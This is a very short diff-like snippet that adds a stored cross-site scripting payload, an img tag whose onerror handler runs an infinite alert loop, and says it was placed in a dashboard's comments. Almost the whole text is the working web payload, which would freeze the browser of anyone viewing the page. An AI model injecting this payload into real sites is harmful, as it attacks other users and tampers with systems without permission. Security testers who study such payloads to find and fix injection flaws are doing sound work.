@@ -1,0 +1,3 @@
+<img src=nothing onerror=while(true)alert('XSS')>
+
+-> Added to the comments in the dashboard.
